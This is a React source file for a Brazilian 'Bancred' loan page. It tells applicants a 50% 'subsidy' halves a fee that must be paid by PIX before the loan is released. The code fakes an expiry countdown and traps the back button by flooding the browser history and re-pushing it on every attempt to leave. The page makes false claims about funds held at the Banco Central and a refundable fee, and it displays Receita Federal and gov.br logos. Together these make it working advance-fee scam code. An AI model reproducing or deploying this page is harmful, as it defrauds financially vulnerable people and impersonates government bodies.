import { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  AlertTriangle,
  ShieldCheck,
  CheckCircle2,
  Clock,
  Sparkles,
  ScrollText,
  Hash,
  FileCheck,
  ShieldAlert,
  AlertCircle,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import receitaLogo from "@/assets/receita-federal-logo.svg";
import govbrLogo from "@/assets/govbr-logo.png";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const Downsell = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const nomeRaw = params.get("nome") || "";
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();

  const valorSaque = useMemo(() => {
    const fromUrl = Number(params.get("valor"));
    if (fromUrl && !Number.isNaN(fromUrl) && fromUrl > 0) return fromUrl;
    const ls = Number(localStorage.getItem("valor_saque") || localStorage.getItem("valorAtual") || 0);
    return ls && !Number.isNaN(ls) && ls > 0 ? ls : 5000;
  }, [params]);

  const valorOriginal = useMemo(() => {
    const fromUrl = Number(params.get("seguroOriginal"));
    const valid = [34.23, 37.32, 43.21];
    if (fromUrl && valid.includes(+fromUrl.toFixed(2))) return +fromUrl.toFixed(2);
    return 34.23;
  }, [params]);
  const valorDesconto = useMemo(() => +(valorOriginal / 2).toFixed(2), [valorOriginal]);

  // Cronômetro 04:59
  const [secs, setSecs] = useState(4 * 60 + 59);
  useEffect(() => {
    const id = setInterval(() => setSecs((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, []);
  const mm = String(Math.floor(secs / 60)).padStart(2, "0");
  const ss = String(secs % 60).padStart(2, "0");

  // Bloqueia saída da página — history trap
  useEffect(() => {
    // Empurra múltiplos estados para preencher o histórico
    for (let i = 0; i < 20; i++) {
      window.history.pushState({ trapped: true }, "", window.location.href);
    }

    const handlePop = () => {
      // Sempre que tentar voltar, empurra de novo para frente
      window.history.pushState({ trapped: true }, "", window.location.href);
      // Mostra alerta customizado
      window.alert("⚠️ ESPERE!\n\nSe você sair agora, perde o subsídio de 50% e a taxa volta para o valor original.\n\nClique em OK e aproveite o desconto exclusivo.");
    };

    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = ""; // Necessário para alguns navegadores
    };

    window.addEventListener("popstate", handlePop);
    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.removeEventListener("popstate", handlePop);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, []);

  const handleCTA = () => {
    const qs = new URLSearchParams(params);
    qs.set("valor", String(valorSaque));
    qs.set("downsell", "1");
    qs.set("seguroValor", String(valorDesconto));
    navigate(`/pagamento?${qs.toString()}`);
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#FFFBEB",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      {/* Barra de urgência fixa */}
      <div
        style={{
          position: "sticky",
          top: 0,
          zIndex: 50,
          background: "linear-gradient(90deg, #DC2626, #B91C1C)",
          color: "#fff",
          padding: "10px 14px",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          gap: 8,
          fontSize: 12.5,
          fontWeight: 700,
          textAlign: "center",
          boxShadow: "0 2px 8px rgba(220,38,38,0.35)",
        }}
      >
        <Clock size={16} />
        <span>
          Subsídio expira em:{" "}
          <span
            style={{
              fontVariantNumeric: "tabular-nums",
              background: "rgba(0,0,0,0.25)",
              padding: "2px 8px",
              borderRadius: 6,
              marginLeft: 4,
            }}
          >
            {mm}:{ss}
          </span>
        </span>
      </div>

      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main style={{ padding: "18px 14px 28px", maxWidth: 480, margin: "0 auto" }}>
        {/* Alerta principal — subsídio liberado */}
        <div
          style={{
            background: "linear-gradient(135deg, #FDF2F8 0%, #FCE7F3 100%)",
            borderWidth: "1px 1px 1px 4px",
            borderStyle: "solid",
            borderColor: "#FBCFE8 #FBCFE8 #FBCFE8 #BE185D",
            borderRadius: 12,
            padding: "14px 16px",
            marginBottom: 14,
            display: "flex",
            alignItems: "flex-start",
            gap: 10,
          }}
        >
          <AlertTriangle size={22} color="#BE185D" style={{ flexShrink: 0, marginTop: 1 }} />
          <div>
            <div style={{ fontSize: 12, fontWeight: 800, color: "#9D174D", letterSpacing: 0.4, textTransform: "uppercase", marginBottom: 4 }}>
              Espere, {primeiroNome}! Subsídio Automático de 50% Liberado
            </div>
            <div style={{ fontSize: 12.5, color: "#831843", lineHeight: 1.55 }}>
              O sistema identificou que você tentou retornar e, para evitar que seu saque de{" "}
              <strong>{formatBRL(valorSaque)}</strong> seja cancelado, cobriu metade da taxa de emissão.
              Você <strong>NÃO</strong> vai mais pagar {formatBRL(valorOriginal)}.
            </div>
          </div>
        </div>

        {/* Card de exigência fiscal — visual NF-e */}
        <section
          style={{
            background: "#FFFFFF",
            borderWidth: "4px 1px 1px",
            borderStyle: "solid",
            borderColor: "#16A34A #DCFCE7 #DCFCE7",
            borderRadius: 14,
            padding: "18px 18px 16px",
            marginBottom: 14,
            boxShadow: "0 10px 28px rgba(22,163,74,0.10)",
            position: "relative",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              borderBottom: "1px dashed #DCFCE7",
              paddingBottom: 12,
              marginBottom: 14,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <ScrollText size={18} color="#15803D" />
              <div style={{ fontSize: 11, fontWeight: 800, color: "#14532D", letterSpacing: 0.6, textTransform: "uppercase" }}>
                Subsídio Bancred — Protocolo Único
              </div>
            </div>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 4,
                fontSize: 10,
                fontWeight: 700,
                color: "#15803D",
                background: "#F0FDF4",
                border: "1px solid #DCFCE7",
                padding: "4px 8px",
                borderRadius: 6,
              }}
            >
              <Hash size={10} /> SUB-50
            </div>
          </div>

          <h1 style={{ fontSize: 21, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.2 }}>
            Não perca seu empréstimo de {formatBRL(valorSaque)} por causa de uma taxa.
          </h1>
          <p style={{ fontSize: 13.5, lineHeight: 1.55, color: "#6B7280", margin: "0 0 14px" }}>
            Você já passou por todas as etapas: análise de CPF, score, endereço e aprovação. Para que esse esforço
            não seja perdido, o sistema liberou um <strong style={{ color: "#15803D" }}>subsídio único de 50%</strong> na
            taxa final, válido apenas nesta tela.
          </p>

          <div
            style={{
              background: "#F0FDF4",
              border: "1px solid #DCFCE7",
              borderRadius: 10,
              padding: "12px 14px",
              display: "grid",
              gap: 8,
            }}
          >
            {[
              { k: "Beneficiário", v: nomeRaw ? nomeRaw.replace(/-/g, " ").trim() : "Cliente", big: false },
              { k: "Saque liberado", v: formatBRL(valorSaque), big: true },
              { k: "Taxa original", v: formatBRL(valorOriginal), strike: true },
              { k: "Com subsídio", v: formatBRL(valorDesconto), big: true, green: true },
            ].map((row) => (
              <div key={row.k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
                <span style={{ fontSize: 11.5, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5, fontWeight: 600 }}>
                  {row.k}
                </span>
                <span
                  style={{
                    fontSize: row.big ? 16 : 13,
                    color: row.green ? "#15803D" : "#111827",
                    fontWeight: row.big ? 900 : 600,
                    textDecoration: row.strike ? "line-through" : "none",
                    opacity: row.strike ? 0.7 : 1,
                  }}
                >
                  {row.v}
                </span>
              </div>
            ))}
          </div>
        </section>

        {/* Passo a passo */}
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 16,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 14,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
            <Sparkles size={16} color="#15803D" />
            <div style={{ fontSize: 14, fontWeight: 800, color: "#111827" }}>
              Como funciona após o pagamento:
            </div>
          </div>
          {[
            `Pagamento único de ${formatBRL(valorDesconto)} via PIX (confirmação em segundos)`,
            "Liberação automática do protocolo de subsídio em seu CPF",
            `Saque de ${formatBRL(valorSaque)} cai direto na sua conta em até 10 minutos`,
          ].map((t, i) => (
            <div key={t} style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: i < 2 ? 10 : 0 }}>
              <span
                style={{
                  flexShrink: 0,
                  width: 22,
                  height: 22,
                  borderRadius: "50%",
                  background: "#15803D",
                  color: "#fff",
                  fontSize: 11,
                  fontWeight: 800,
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                {i + 1}
              </span>
              <div style={{ fontSize: 13, color: "#111827", lineHeight: 1.5, paddingTop: 1 }}>{t}</div>
            </div>
          ))}
        </div>

        {/* Por que o desconto existe */}
        <div
          style={{
            background: "#FFFBEB",
            borderWidth: "1px 1px 1px 4px",
            borderStyle: "solid",
            borderColor: "#FEF3C7 #FEF3C7 #FEF3C7 #B45309",
            borderRadius: 10,
            padding: "12px 14px",
            marginBottom: 14,
            display: "flex",
            gap: 10,
          }}
        >
          <AlertCircle size={20} color="#B45309" style={{ flexShrink: 0, marginTop: 1 }} />
          <div style={{ fontSize: 12.5, color: "#78350F", lineHeight: 1.55 }}>
            <strong>Por que você está recebendo este subsídio?</strong> Sua proposta já foi 100% aprovada e o valor está
            reservado no Banco Central em seu nome. Como o sistema detectou que você ia abandonar, a Bancred absorve
            metade da taxa para garantir que o repasse aconteça hoje, e o crédito não retorne ao FGC.
          </div>
        </div>

        {/* Aviso de prazo */}
        <div
          style={{
            background: "#FEF2F2",
            borderWidth: "1.5px 1.5px 1.5px 4px",
            borderStyle: "solid",
            borderColor: "#FCA5A5 #FCA5A5 #FCA5A5 #DC2626",
            borderRadius: 10,
            padding: 14,
            marginBottom: 14,
            display: "flex",
            gap: 10,
          }}
        >
          <ShieldAlert size={22} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
          <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.55 }}>
            <div style={{ fontWeight: 900, fontSize: 13, marginBottom: 6, color: "#991B1B", textTransform: "uppercase", letterSpacing: 0.3 }}>
              ⚠️ Subsídio único e não cumulativo
            </div>
            Esta tela só aparece <strong>uma vez por CPF</strong>. Se você sair sem concluir, a taxa volta para{" "}
            <strong>{formatBRL(valorOriginal)}</strong> e a proposta de {formatBRL(valorSaque)} é encerrada
            automaticamente, sem possibilidade de reabertura.
          </div>
        </div>

        {/* Valor final destacado */}
        <div
          style={{
            background: "#FFFFFF",
            border: "1px solid #DCFCE7",
            borderRadius: 14,
            padding: "16px 18px",
            marginBottom: 18,
            position: "relative",
            overflow: "hidden",
          }}
        >
          <div
            style={{
              position: "absolute",
              top: 12,
              right: 12,
              padding: "4px 10px",
              border: "1.5px solid #15803D",
              color: "#15803D",
              borderRadius: 6,
              fontSize: 10,
              fontWeight: 900,
              letterSpacing: 1,
              textTransform: "uppercase",
              transform: "rotate(-6deg)",
              opacity: 0.9,
            }}
          >
            -50%
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
            <FileCheck size={16} color="#15803D" />
            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa com subsídio aplicado</div>
          </div>
          <div style={{ display: "flex", alignItems: "baseline", gap: 10 }}>
            <div style={{ fontSize: 14, color: "#9CA3AF", textDecoration: "line-through", fontWeight: 600 }}>
              {formatBRL(valorOriginal)}
            </div>
            <div style={{ fontSize: 36, fontWeight: 900, color: "#15803D", lineHeight: 1 }}>
              {formatBRL(valorDesconto)}
            </div>
          </div>
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: 6,
              marginTop: 10,
              background: "#F0FDF4",
              border: "1px solid #BBF7D0",
              color: "#166534",
              padding: "6px 12px",
              borderRadius: 999,
              fontSize: 11.5,
              fontWeight: 700,
            }}
          >
            <CheckCircle2 size={13} /> 100% reembolsável junto com seu saque
          </div>
        </div>

        <button
          type="button"
          onClick={handleCTA}
          style={{
            width: "100%",
            padding: "15px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 800,
            letterSpacing: -0.2,
            cursor: "pointer",
            boxShadow: "0 8px 24px rgba(22,163,74,0.30)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            fontFamily: fontStack,
            minHeight: 54,
            textTransform: "uppercase",
          }}
        >
          Aproveitar subsídio e liberar meu PIX
        </button>


        {/* Selo de garantia */}
        <div
          style={{
            marginTop: 16,
            background: "#fff",
            border: "1px dashed #16A34A",
            borderRadius: 14,
            padding: 14,
            display: "flex",
            alignItems: "center",
            gap: 12,
          }}
        >
          <div
            style={{
              width: 42,
              height: 42,
              borderRadius: "50%",
              background: "#DCFCE7",
              color: "#15803D",
              display: "inline-flex",
              alignItems: "center",
              justifyContent: "center",
              flexShrink: 0,
            }}
          >
            <ShieldCheck size={22} />
          </div>
          <div>
            <div style={{ fontSize: 13, fontWeight: 700, color: "#111827" }}>Garantia de Reembolso</div>
            <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5, marginTop: 2 }}>
              Os {formatBRL(valorDesconto)} são <strong>100% reembolsáveis</strong> junto com seu saque de{" "}
              {formatBRL(valorSaque)}.
            </div>
          </div>
        </div>

        <footer style={{ marginTop: 22, textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 18, marginBottom: 10 }}>
            <img
              src={receitaLogo}
              alt="Receita Federal do Brasil"
              style={{ height: 64, width: "auto", opacity: 0.85, display: "block" }}
            />
            <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
            <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
          </div>
          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto" }}>
            Operação registrada e auditável. Subsídio concedido em conformidade com a política de retenção da Bancred.
          </div>
        </footer>
      </main>
    </div>
  );
};

export default Downsell;
